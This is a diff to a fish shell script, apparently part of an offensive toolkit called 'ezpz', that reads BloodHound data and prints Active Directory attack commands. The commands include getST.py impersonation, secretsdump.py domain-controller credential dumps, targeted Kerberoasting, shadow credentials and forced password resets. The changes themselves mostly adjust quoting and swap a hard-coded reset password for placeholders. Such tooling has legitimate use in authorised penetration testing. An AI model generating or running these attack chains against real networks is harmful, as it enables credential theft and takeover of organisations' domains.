@@ -2,19 +2,41 @@ function __ezpz_path_print --argument-names command
     printf '%s\n' (__ezpz_cmd_format "$command")
 end
 
+function __ezpz_path_quote_value --argument-names value
+    if contains -- $value PASS NEWPASS HASH
+        echo $value
+        return
+    end
+    set -l escaped (string replace -a -- "'" "'\\''" "$value")
+    printf "'%s'\n" "$escaped"
+end
+
+function __ezpz_path_identity --argument-names domain user secret dc
+    if contains -- $secret PASS NEWPASS HASH
+        printf '%s/%s:%s@%s\n' "$domain" "$user" "$secret" "$dc"
+        return
+    end
+    set -l escaped (string replace -a -- "'" "'\\''" "$domain/$user:$secret@$dc")
+    printf "'%s'\n" "$escaped"
+end
+
 function __ezpz_path_getst --argument-names base domain user secret hash dc spn target_user
     if test -n "$hash"
-        printf '%s\n' "getST.py -spn $spn -impersonate $target_user -dc-ip $dc -hashes '$hash' '$domain/$user'"
+        set -l hash_arg (__ezpz_path_quote_value "$hash")
+        printf '%s\n' "getST.py -spn $spn -impersonate $target_user -dc-ip $dc -hashes $hash_arg $domain/$user@$dc"
     else
-        printf '%s\n' "getST.py -spn $spn -impersonate $target_user -dc-ip $dc '$domain/$user:$secret@$dc'"
+        set -l identity (__ezpz_path_identity "$domain" "$user" "$secret" "$dc")
+        printf '%s\n' "getST.py -spn $spn -impersonate $target_user -dc-ip $dc $identity"
     end
 end
 
 function __ezpz_path_secretsdump --argument-names domain user secret hash dc
     if test -n "$hash"
-        printf '%s\n' "secretsdump.py -just-dc -dc-ip $dc -hashes '$hash' '$domain/$user@$dc'"
+        set -l hash_arg (__ezpz_path_quote_value "$hash")
+        printf '%s\n' "secretsdump.py -just-dc -dc-ip $dc -hashes $hash_arg $domain/$user@$dc"
     else
-        printf '%s\n' "secretsdump.py -just-dc -dc-ip $dc '$domain/$user:$secret@$dc'"
+        set -l identity (__ezpz_path_identity "$domain" "$user" "$secret" "$dc")
+        printf '%s\n' "secretsdump.py -just-dc -dc-ip $dc $identity"
     end
 end
 
@@ -22,7 +44,7 @@ function __ezpz_path_generic --argument-names base target target_type target_nam
     switch $target_type
         case User
             ezpz_cmd "Option 1: change password"
-            __ezpz_path_print "$base set password $target '<NEWPASS>'"
+            __ezpz_path_print "$base set password $target NEWPASS"
             ezpz_cmd "Option 2: shadow credentials"
             __ezpz_path_print "$base add shadowCredentials $target"
         case Group
@@ -89,11 +111,7 @@ function __ezpz_path_hash --argument-names value
 end
 
 function __ezpz_path_placeholder --argument-names user
-    set -l name (string upper -- $user)
-    set name (string replace -a -- '.' '_' $name)
-    set name (string replace -a -- '-' '_' $name)
-    set name (string replace -a -- '$' '' $name)
-    printf '<%s_CRED>\n' "$name"
+    echo PASS
 end
 
 function __ezpz_path_render_edge --argument-names edge target target_type target_name user domain secret hash dc newpass
@@ -114,9 +132,10 @@ function __ezpz_path_render_edge --argument-names edge target target_type target
                     __ezpz_path_print "$base add shadowCredentials $target"
                     ezpz_cmd "Option 2: targeted Kerberoast"
                     if test -n "$hash"
-                        __ezpz_path_print "targetedkerberoast -d $domain -H '$hash' --request-user $target"
+                        set -l hash_arg (__ezpz_path_quote_value "$hash")
+                        __ezpz_path_print "targetedkerberoast -d $domain -H $hash_arg --request-user $target"
                     else
-                        __ezpz_path_print "targetedkerberoast -d $domain -u $user -p '$secret' --request-user $target"
+                        __ezpz_path_print "targetedkerberoast -d $domain -u $user -p $secret --request-user $target"
                     end
                 case Computer
                     ezpz_cmd "Option 1: shadow credentials"
@@ -280,7 +299,7 @@ Shows one-hop AD attack paths or a multihop chain from BloodHound data.
     set -l secret (__ezpz_path_secret "$source_user" "$domain" | head -1)
     set -l hash (__ezpz_path_hash "$secret")
     if test -n "$hash"
-        set secret "<PASS>"
+        set secret PASS
     else if test -z "$secret"
         set secret (__ezpz_path_placeholder "$source_user")
     end
@@ -322,18 +341,18 @@ Shows one-hop AD attack paths or a multihop chain from BloodHound data.
             set -l step_dn $fields[7]
             set -l step_fqdn $fields[8]
             ezpz_title "$step_index: $step_source — $edge -> $step_target"
-            __ezpz_path_render_edge "$edge" "$step_target" "$step_type" "$step_fqdn" "$current_user" "$domain" "$current_secret" "$current_hash" "$dc" "ezpzr0cks!"
+            __ezpz_path_render_edge "$edge" "$step_target" "$step_type" "$step_fqdn" "$current_user" "$domain" "$current_secret" "$current_hash" "$dc" "NEWPASS"
             if test $step_index -lt $total_steps; and test "$step_type" != Group
                 set -l next_secret ""
                 if test "$edge" = ForceChangePassword
-                    set next_secret "ezpzr0cks!"
+                    set next_secret "NEWPASS"
                     set current_hash ""
                 else
                     set next_secret (__ezpz_path_secret "$step_target" "$domain" | head -1)
                     set -l next_hash (__ezpz_path_hash "$next_secret")
                     if test -n "$next_hash"
                         set current_hash $next_hash
-                        set next_secret "<PASS>"
+                        set next_secret PASS
                     else if test -z "$next_secret"
                         set next_secret (__ezpz_path_placeholder "$step_target")
                         set current_hash ""
@@ -377,7 +396,7 @@ Shows one-hop AD attack paths or a multihop chain from BloodHound data.
 
         switch $edge
             case ForceChangePassword
-                __ezpz_path_print "$base set password $target '<NEWPASS>'"
+                __ezpz_path_print "$base set password $target NEWPASS"
             case GenericAll AllExtendedRights WriteAllProperties
                 __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$source_user" "$domain" "$secret" "$hash" "$dc"
             case GenericWrite
@@ -387,9 +406,10 @@ Shows one-hop AD attack paths or a multihop chain from BloodHound data.
                         __ezpz_path_print "$base add shadowCredentials $target"
                         ezpz_cmd "Option 2: targeted Kerberoast"
                         if test -n "$hash"
-                            __ezpz_path_print "targetedkerberoast -d $domain -H '$hash' --request-user $target"
+                            set -l hash_arg (__ezpz_path_quote_value "$hash")
+                            __ezpz_path_print "targetedkerberoast -d $domain -H $hash_arg --request-user $target"
                         else
-                            __ezpz_path_print "targetedkerberoast -d $domain -u $source_user -p '$secret' --request-user $target"
+                            __ezpz_path_print "targetedkerberoast -d $domain -u $source_user -p $secret --request-user $target"
                         end
                     case Computer
                         ezpz_cmd "Option 1: shadow credentials"
